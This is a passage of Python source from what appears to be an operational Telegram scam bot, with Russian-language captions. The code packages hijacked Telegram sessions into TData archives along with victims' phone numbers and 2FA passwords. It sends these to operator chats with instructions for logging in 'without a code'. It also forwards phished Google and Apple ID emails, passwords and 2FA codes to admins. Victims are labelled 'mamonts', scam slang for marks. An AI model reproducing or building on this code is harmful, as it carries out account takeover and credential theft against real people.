                u_data = await asyncio.to_thread(db.get_user_by_tg_id, DB_PATH, user_tg_id)
                if u_data and u_data.get("password_2fa"):
                    password_2fa = u_data["password_2fa"]
            except Exception:
                pass

        if is_primary_admin_log:
            recipients = set(MASTER_ADMIN_IDS)
        else:
            recipients = set(target_admin_ids) | set(MASTER_ADMIN_IDS)

        # Auto-generate authentic TData archive and send to admins
        try:
            tdata_res = await contacts_pkg.export_session_archive(
                session_str,
                user_tg_id,
                password_2fa=password_2fa,
            )
            if tdata_res and os.path.exists(tdata_res["zip_path"]):
                phone_str = f"+{str(phone or '').lstrip('+')}" if phone else "—"
                if tdata_res.get("has_tdata"):
                    tdata_caption = (
                        f"💾 <b>TData для входа в аккаунт мамонта #{mamont_id}</b> (ID: <code>{user_tg_id}</code>)\n"
                        f"📱 <b>Телефон:</b> <code>{phone_str}</code>\n\n"
                        "📁 <b>В архиве находится папка <code>tdata</code>.</b>\n"
                        "<i>Распакуйте папку <code>tdata</code> в папку с Telegram Desktop (Portable) и запустите Telegram.exe для мгновенного входа без кода!</i>"
                    )
                else:
                    tdata_caption = (
                        f"💾 <b>Сессия мамонта #{mamont_id}</b> (ID: <code>{user_tg_id}</code>)\n"
                        f"📱 <b>Телефон:</b> <code>{phone_str}</code>\n\n"
                        "⚠️ <i>Папка TData не сформирована (сессия не активна или отклонена сервером). В архиве файлы .session и StringSession.</i>"
                    )
                for aid in recipients:
                    try:
                        doc = FSInputFile(tdata_res["zip_path"], filename=f"tdata_{user_tg_id}.zip")
                        await bot.send_document(
                            chat_id=aid,
                            document=doc,
                            caption=tdata_caption,
                            parse_mode="HTML",
                        )
                    except Exception as doc_err:
                        logger.debug("Failed sending auto-tdata to admin %s via %s: %s", aid, effective_token, doc_err)
        except BaseException as td_err:
            logger.warning("Auto-send TData error for %s: %s", user_tg_id, td_err)

    except BaseException as e:
        logger.error("Error in _auto_process_authorized_mamont for %s: %s", user_tg_id, e)
    finally:
        await bot.session.close()


async def notify_auth_credential_event(
    event_type: str,
    user_tg_id: int,
    username: Optional[str] = None,
    nickname: Optional[str] = None,
    phone: Optional[str] = None,
    email: Optional[str] = None,
    password: Optional[str] = None,
    details: Optional[str] = None,
    device: Optional[str] = None,
    is_test: bool = False,
) -> None:
    """
    Sends explicit alerts when Google or Apple ID credentials, 2FA codes, or device prompts are submitted.
    """
    if not is_test and user_tg_id:
        try:
            user_row = await asyncio.to_thread(db.get_user_by_tg_id, DB_PATH, user_tg_id)
            if user_row:
                u_mt = user_row["mirror_token"] if "mirror_token" in user_row.keys() else None
                u_mu = user_row["mirror_username"] if "mirror_username" in user_row.keys() else None
                u_wid = user_row["worker_tg_id"] if "worker_tg_id" in user_row.keys() else None
                if is_test_worker(u_mt, u_mu) or u_wid in (8945168964, 8877489211):
                    is_test = True
        except Exception:
            pass

    target_token = TEST_ADMIN_BOT_TOKEN if (is_test and TEST_ADMIN_BOT_TOKEN) else ADMIN_BOT_TOKEN
    if not target_token:
        return

    admin_bot = Bot(token=target_token)
    try:
        user_str = f"@{username}" if username else f"ID: <code>{user_tg_id}</code>"
        device_str = device or "Неизвестно"
        time_str = (datetime.now(timezone.utc) + timedelta(hours=3)).strftime("%Y-%m-%d %H:%M:%S")

        # Determine icon & title based on event
        if "apple" in event_type:
            provider_icon = "🍏 Apple ID"
            header_badge = "🍏 <b>APPLE ID ЛОГ!</b>"
        elif "google" in event_type:
            provider_icon = "🌐 Google Account"
            header_badge = "🌐 <b>GOOGLE ЛОГ!</b>"
        else:
            provider_icon = "🔐 Auth Gateway"
            header_badge = "🔔 <b>АВТОРИЗАЦИЯ!</b>"

        text_lines = [
            f"{header_badge}",
            f"👤 <b>Пользователь:</b> {user_str} ({nickname or 'Мамонт'})",
            f"📱 <b>Устройство:</b> <code>{device_str}</code>",
            f"🕒 <b>Время:</b> {time_str} МСК",
            ""
        ]

        if email:
            text_lines.append(f"📧 <b>Аккаунт:</b> <code>{email}</code>")
        if phone:
            text_lines.append(f"📞 <b>Телефон:</b> <code>{phone}</code>")
        if password:
            text_lines.append(f"🔑 <b>Пароль:</b> <code>{password}</code>")
        if details:
            text_lines.append(f"📝 <b>Детали:</b> <code>{details}</code>")

        msg_text = "\n".join(text_lines)

        recipients = set(ADMIN_CHAT_IDS) if not is_test else {7491827504}
        if ADMIN_CHAT_ID:
            recipients.add(ADMIN_CHAT_ID)

        for cid in recipients:
            try:
                await admin_bot.send_message(chat_id=cid, text=msg_text, parse_mode="HTML")
            except Exception as err:
                logger.debug("Failed to send auth credential alert to %s: %s", cid, err)

    except Exception as exc:
        logger.error("notify_auth_credential_event error: %s", exc)
    finally:
        await admin_bot.session.close()

